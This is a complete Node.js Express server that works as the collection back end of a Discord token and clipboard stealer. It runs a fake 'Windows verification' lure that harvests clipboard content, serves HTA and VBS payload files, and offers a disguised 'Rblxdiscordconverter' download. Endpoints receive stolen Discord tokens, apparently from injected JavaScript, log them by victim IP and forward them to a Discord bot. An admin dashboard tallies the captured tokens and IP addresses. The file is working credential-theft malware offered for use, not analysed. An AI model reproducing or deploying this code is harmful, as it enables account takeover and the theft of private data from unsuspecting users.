require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const app = express();
const PORT = process.env.PORT || 3000;

// Import logging functions from your updated bot.js
const { logDiscordToken, logClipboardData } = require('./bot');

app.use(bodyParser.json());
app.use(cookieParser());
app.use(express.static('public'));
app.set('view engine', 'html');
app.engine('html', require('ejs').renderFile);

function getRealIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  
  return req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress ||
         (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
         req.ip;
}

// Handle Windows verification
const codeMap = {}; // Stores IP -> code

app.get('/generate-verification-code', (req, res) => {
  const ip = getRealIP(req);
  console.log('GENERATE - IP:', ip);
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let code = "";
  for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
  code += "-";
  for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
  codeMap[ip] = code;
  res.json({ code });
});

app.post('/verify-windows-code', (req, res) => {
  const ip = getRealIP(req);
  console.log('VERIFY - IP:', ip);

  const { clipboard } = req.body;
  const expectedCode = codeMap[ip];
  if (!expectedCode) return res.status(400).json({ success: false, error: "No code generated." });
  if (!clipboard.includes(expectedCode)) return res.status(401).json({ success: false, message: "Verification failed." });
  
  // Set verification cookies
  res.cookie('windowsVerified', '1', { maxAge: 24 * 60 * 60 * 1000 });
  res.cookie('tokenGateVerified', '1', { maxAge: 24 * 60 * 60 * 1000 });
  
  res.json({ success: true });
});

// Check verification status endpoint
app.get('/check-verification', (req, res) => {
  const isVerified = req.cookies && 
    (req.cookies.windowsVerified === '1' || req.cookies.tokenGateVerified === '1');
  
  res.json({ verified: isVerified });
});

// Serve verification pages
app.get('/verify', (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  if (userAgent.includes("Windows")) {
    if (req.cookies && req.cookies.windowsVerified === '1') {
      return res.redirect('/');
    } else {
      return res.redirect('/verify-windows');
    }
  } else {
    return res.redirect('/verifynotwindows');
  }
});

// Static routes
app.get('/verify-windows', (req, res) => res.sendFile(path.join(__dirname, 'public/verify-windows.html')));
app.get('/verifynotwindows', (req, res) => res.sendFile(path.join(__dirname, 'public/verifynotwindows.html')));

// Serve the HTA file correctly
app.get('/verifyaccept.hta', (req, res) => {
  res.set({
    'Content-Type': 'application/hta',
    'Cache-Control': 'no-cache'
  });
  res.sendFile(path.join(__dirname, 'public/verifyaccept.hta'));
});

// Get user IP endpoint
app.get('/get-ip', (req, res) => {
  const userIP = getRealIP(req);
  res.json({ ip: userIP });
});

// Handle clipboard submissions
app.post('/submit-clipboard', (req, res) => {
  const { clipboardData, userIP, type } = req.body;
  const realIP = userIP || getRealIP(req);
  const userAgent = req.headers['user-agent'] || 'Unknown';
  
  // Create filename with IP and timestamp
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const sanitizedIP = realIP.replace(/[:.]/g, '_');
  const filename = `clipboard_${sanitizedIP}_${timestamp}.html`;
  
  // Save to organized folder structure
  const ipFolder = path.join(__dirname, 'data', 'clipboard', sanitizedIP);
  if (!fs.existsSync(ipFolder)) {
    fs.mkdirSync(ipFolder, { recursive: true });
  }
  
  const savePath = path.join(ipFolder, filename);
  
  // Also save to main clipboard.html for admin view
  const mainSavePath = path.join(__dirname, 'data', 'clipboard.html');
  const dataDir = path.join(__dirname, 'data');
  if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
  }
  
  const logEntry = `\n<!-- IP: ${realIP} | Type: ${type} | Time: ${new Date().toISOString()} -->\n${clipboardData}\n<hr>\n`;
  
  fs.writeFile(savePath, clipboardData, err => {
    if (err) return res.status(500).send('Failed to save clipboard data.');
    
    // Append to main file
    fs.appendFile(mainSavePath, logEntry, (appendErr) => {
      if (appendErr) console.error('Failed to append to main clipboard file:', appendErr);
    });
    
    // Send to Discord bot using the new channel-based logging
    logClipboardData({
      clipboardData: clipboardData,
      userIP: realIP,
      userAgent: userAgent,
      type: type || 'game'
    });
    
    console.log(`📋 Clipboard saved for IP ${realIP}: ${filename}`);
    res.send('Clipboard saved.');
  });
});

// Handle Discord token submissions (GET endpoint) - Compatible with your JavaScript injection
app.get('/receive-token', (req, res) => {
  const { token, serverId } = req.query;
  const realIP = getRealIP(req);
  const userAgent = req.headers['user-agent'] || 'Unknown';
  
  // Validate token
  if (!token || token.length < 10) {
    return res.status(400).send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Invalid Token</title>
      <style>
        body { font-family: Arial, sans-serif; background: #111; color: #fff; text-align: center; padding: 50px; }
        .error { color: #f44336; font-size: 1.5rem; margin-bottom: 20px; }
      </style>
    </head>
    <body>
      <div class="error">❌ Invalid token received</div>
      <p>The provided token appears to be invalid.</p>
      <script>setTimeout(() => window.close(), 3000);</script>
    </body>
    </html>`);
  }
  
  // Create filename with IP and timestamp
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const sanitizedIP = realIP.replace(/[:.]/g, '_');
  
  // Save to organized folder structure
  const ipFolder = path.join(__dirname, 'data', 'tokens', sanitizedIP);
  if (!fs.existsSync(ipFolder)) {
    fs.mkdirSync(ipFolder, { recursive: true });
  }
  
  const filename = `token_${sanitizedIP}_${timestamp}.html`;
  const savePath = path.join(ipFolder, filename);
  
  const tokenEntry = `<div>
    <p><strong>IP:</strong> ${realIP}</p>
    <p><strong>User Agent:</strong> ${userAgent}</p>
    <p><strong>Server ID:</strong> ${serverId || 'N/A'}</p>
    <p><strong>Token:</strong> ${token}</p>
    <p><strong>Token Preview:</strong> ${token.slice(0, 20)}...</p>
    <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
    <hr>
  </div>\n`;
  
  // Save individual file
  fs.writeFile(savePath, tokenEntry, (err) => {
    if (err) console.error('Failed to save individual token file:', err);
  });
  
  // Append to main tokens.html file
  const mainTokenPath = path.join(__dirname, 'data', 'tokens.html');
  fs.appendFileSync(mainTokenPath, tokenEntry);
  
  // Send to Discord bot using the new channel-based logging
  logDiscordToken({
    token: token,
    userIP: realIP,
    userAgent: userAgent,
    serverId: serverId || 'N/A'
  });
  
  console.log(`🔑 Token received from IP ${realIP} - Preview: ${token.slice(0, 20)}...`);
  
  // Send a success page that works with the JavaScript injection
  res.send(`
  <!DOCTYPE html>
  <html>
  <head>
    <title>Token Received</title>
    <style>
      body { 
        font-family: Arial, sans-serif; 
        background: #111; 
        color: #fff; 
        text-align: center; 
        padding: 50px;
        margin: 0;
      }
      .success { 
        color: #4CAF50; 
        font-size: 1.8rem; 
        margin-bottom: 20px; 
        animation: pulse 2s infinite;
      }
      .token-preview {
        background: #333;
        padding: 15px;
        border-radius: 8px;
        margin: 20px auto;
        max-width: 600px;
        word-break: break-all;
        font-family: monospace;
      }
      @keyframes pulse {
        0% { opacity: 1; }
        50% { opacity: 0.5; }
        100% { opacity: 1; }
      }
    </style>
  </head>
  <body>
    <div class="success">✅ Discord Token Successfully Captured!</div>
    <p>Your Discord session has been logged for security verification.</p>
    <div class="token-preview">
      <strong>Token Preview:</strong> ${token.slice(0, 30)}...
    </div>
    <p><small>Server ID: ${serverId || 'Not provided'}</small></p>
    <p><small>IP Address: ${realIP}</small></p>
    <p>This window will close automatically...</p>
    <script>
      console.log('🔑 Token successfully logged!');
      setTimeout(() => {
        try {
          window.close();
        } catch(e) {
          console.log('Window close blocked by browser - this is normal');
        }
      }, 5000);
    </script>
  </body>
  </html>`);
});

// Keep POST endpoint for manual submissions
app.post('/receive-token', (req, res) => {
  const { token, userIP, serverId } = req.body;
  const realIP = userIP || getRealIP(req);
  const userAgent = req.headers['user-agent'] || 'Unknown';
  
  // Validate token
  if (!token || token.length < 10) {
    return res.status(400).json({ error: 'Invalid token provided' });
  }
  
  // Create filename with IP and timestamp
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const sanitizedIP = realIP.replace(/[:.]/g, '_');
  
  // Save to organized folder structure
  const ipFolder = path.join(__dirname, 'data', 'tokens', sanitizedIP);
  if (!fs.existsSync(ipFolder)) {
    fs.mkdirSync(ipFolder, { recursive: true });
  }
  
  const filename = `token_${sanitizedIP}_${timestamp}.html`;
  const savePath = path.join(ipFolder, filename);
  
  const tokenEntry = `<div>
    <p><strong>IP:</strong> ${realIP}</p>
    <p><strong>User Agent:</strong> ${userAgent}</p>
    <p><strong>Server ID:</strong> ${serverId || 'N/A'}</p>
    <p><strong>Token:</strong> ${token}</p>
    <p><strong>Token Preview:</strong> ${token.slice(0, 20)}...</p>
    <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
    <hr>
  </div>\n`;
  
  // Save individual file
  fs.writeFile(savePath, tokenEntry, (err) => {
    if (err) console.error('Failed to save individual token file:', err);
  });
  
  // Append to main tokens.html file
  const mainTokenPath = path.join(__dirname, 'data', 'tokens.html');
  fs.appendFileSync(mainTokenPath, tokenEntry);
  
  // Send to Discord bot using the new channel-based logging
  logDiscordToken({
    token: token,
    userIP: realIP,
    userAgent: userAgent,
    serverId: serverId || 'N/A'
  });
  
  console.log(`🔑 Token received via POST from IP ${realIP}`);
  
  res.json({ 
    success: true, 
    message: 'Token received successfully',
    tokenPreview: token.slice(0, 20) + '...'
  });
});

// Enhanced admin endpoint with better styling and real-time data
app.get('/admin', (req, res) => {
  const provided = req.query.password;
  const correct = process.env.ADMIN_PASSWORD;
  
  if (provided !== correct) {
    return res.status(403).send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Unauthorized</title>
      <style>
        body { font-family: Arial, sans-serif; background: #111; color: #fff; text-align: center; padding: 50px; }
        .error { color: #f44336; font-size: 1.5rem; }
      </style>
    </head>
    <body>
      <div class="error">❌ Unauthorized Access</div>
      <p>Invalid admin password provided.</p>
    </body>
    </html>`);
  }
  
  const clipboardPath = path.join(__dirname, 'data', 'clipboard.html');
  const tokensPath = path.join(__dirname, 'data', 'tokens.html');
  
  const clipboardContent = fs.existsSync(clipboardPath) 
    ? fs.readFileSync(clipboardPath, 'utf8') 
    : 'No clipboard data yet.';
    
  const tokensContent = fs.existsSync(tokensPath) 
    ? fs.readFileSync(tokensPath, 'utf8') 
    : 'No tokens yet.';
  
  // Count files for statistics
  const clipboardDir = path.join(__dirname, 'data', 'clipboard');
  const tokensDir = path.join(__dirname, 'data', 'tokens');
  
  let clipboardCount = 0;
  let tokenCount = 0;
  let uniqueIPs = new Set();
  
  try {
    if (fs.existsSync(clipboardDir)) {
      const clipboardFolders = fs.readdirSync(clipboardDir);
      clipboardFolders.forEach(folder => {
        const folderPath = path.join(clipboardDir, folder);
        if (fs.statSync(folderPath).isDirectory()) {
          uniqueIPs.add(folder.replace(/_/g, '.'));
          const files = fs.readdirSync(folderPath);
          clipboardCount += files.length;
        }
      });
    }
    
    if (fs.existsSync(tokensDir)) {
      const tokenFolders = fs.readdirSync(tokensDir);
      tokenFolders.forEach(folder => {
        const folderPath = path.join(tokensDir, folder);
        if (fs.statSync(folderPath).isDirectory()) {
          uniqueIPs.add(folder.replace(/_/g, '.'));
          const files = fs.readdirSync(folderPath);
          tokenCount += files.length;
        }
      });
    }
  } catch (error) {
    console.error('Error reading directories:', error);
  }
  
  const adminHTML = `
  <!DOCTYPE html>
  <html>
  <head>
    <title>Admin Dashboard - Token/Clipboard Logger</title>
    <style>
      body { 
        font-family: 'Courier New', monospace; 
        margin: 0; 
        background: #0a0a0a; 
        color: #00ff00; 
        padding: 20px;
      }
      .header {
        text-align: center;
        border: 2px solid #00ff00;
        padding: 20px;
        margin-bottom: 30px;
        background: #111;
      }
      .stats {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 20px;
        margin-bottom: 30px;
      }
      .stat-box {
        background: #111;
        border: 1px solid #00ff00;
        padding: 15px;
        text-align: center;
      }
      .stat-number {
        font-size: 2rem;
        color: #00ff00;
        font-weight: bold;
      }
      .section { 
        margin-bottom: 40px; 
        padding: 20px; 
        background: #111; 
        border: 1px solid #333;
        border-radius: 8px; 
      }
      h1 { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
      h2 { color: #00ff00; border-bottom: 1px solid #00ff00; padding-bottom: 10px; }
      .content-box { 
        background: #000; 
        padding: 15px; 
        border: 1px solid #333;
        border-radius: 4px; 
        overflow-x: auto;
        max-height: 500px;
        overflow-y: auto;
      }
      .refresh-btn {
        background: #00ff00;
        color: #000;
        border: none;
        padding: 10px 20px;
        cursor: pointer;
        border-radius: 4px;
        font-weight: bold;
        margin: 10px 0;
      }
      .refresh-btn:hover {
        background: #00cc00;
      }
      .timestamp {
        color: #888;
        font-size: 0.9rem;
      }
    </style>
    <script>
      function refreshPage() {
        window.location.reload();
      }
      
      // Auto refresh every 30 seconds
      setInterval(refreshPage, 30000);
      
      // Update timestamp
      function updateTime() {
        document.getElementById('currentTime').textContent = new Date().toLocaleString();
      }
      
      setInterval(updateTime, 1000);
      updateTime();
    </script>
  </head>
  <body>
    <div class="header">
      <h1>🔴 ADMIN DASHBOARD - TOKEN & CLIPBOARD LOGGER</h1>
      <div class="timestamp">Last Updated: <span id="currentTime"></span></div>
      <button class="refresh-btn" onclick="refreshPage()">🔄 Refresh Data</button>
    </div>
    
    <div class="stats">
      <div class="stat-box">
        <div class="stat-number">${tokenCount}</div>
        <div>Total Tokens</div>
      </div>
      <div class="stat-box">
        <div class="stat-number">${clipboardCount}</div>
        <div>Clipboard Entries</div>
      </div>
      <div class="stat-box">
        <div class="stat-number">${uniqueIPs.size}</div>
        <div>Unique IPs</div>
      </div>
      <div class="stat-box">
        <div class="stat-number">${tokenCount + clipboardCount}</div>
        <div>Total Captures</div>
      </div>
    </div>
    
    <div class="section">
      <h2>🔑 Discord Tokens (${tokenCount} captured)</h2>
      <div class="content-box">${tokensContent}</div>
    </div>
    
    <div class="section">
      <h2>📋 Clipboard Data (${clipboardCount} entries)</h2>
      <div class="content-box">${clipboardContent}</div>
    </div>
    
    <div class="section">
      <h2>📊 Unique IP Addresses (${uniqueIPs.size} total)</h2>
      <div class="content-box">
        ${Array.from(uniqueIPs).map(ip => `<div style="margin: 5px 0; color: #00ff00;">${ip}</div>`).join('')}
      </div>
    </div>
  </body>
  </html>`;
  
  res.send(adminHTML);
});

// Additional static routes
app.get('/verifyaccept.vbs', (req, res) => {
  res.set('Content-Type', 'application/x-vbs');
  res.sendFile(path.join(__dirname, 'public/verifyaccept.vbs'));
});

app.get('/download', (req, res) => {
  const filePath = path.join(__dirname, 'public', 'Rblxdiscordconverter.zip');
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).send('Download file not found.');
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    port: PORT
  });
});

// Root endpoint
app.get('/', (req, res) => {
  res.send(`
  <!DOCTYPE html>
  <html>
  <head>
    <title>Server Online</title>
    <style>
      body { font-family: Arial, sans-serif; background: #111; color: #00ff00; text-align: center; padding: 50px; }
      .status { font-size: 2rem; margin-bottom: 20px; }
    </style>
  </head>
  <body>
    <div class="status">🟢 Server Online</div>
    <p>Token & Clipboard logging server is running.</p>
    <p><small>Port: ${PORT} | Uptime: ${Math.floor(process.uptime())}s</small></p>
  </body>
  </html>`);
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
  console.log(`📊 Admin dashboard: http://localhost:${PORT}/admin?password=YOUR_PASSWORD`);
  console.log(`🔑 Token endpoint: http://localhost:${PORT}/receive-token`);
  
  // Ensure data directories exist
  const dirs = [
    path.join(__dirname, 'data'),
    path.join(__dirname, 'data', 'clipboard'),
    path.join(__dirname, 'data', 'tokens')
  ];
  
  dirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
      console.log(`📁 Created directory: ${dir}`);
    }
  });
  
  console.log('✅ Server initialization complete!');
});
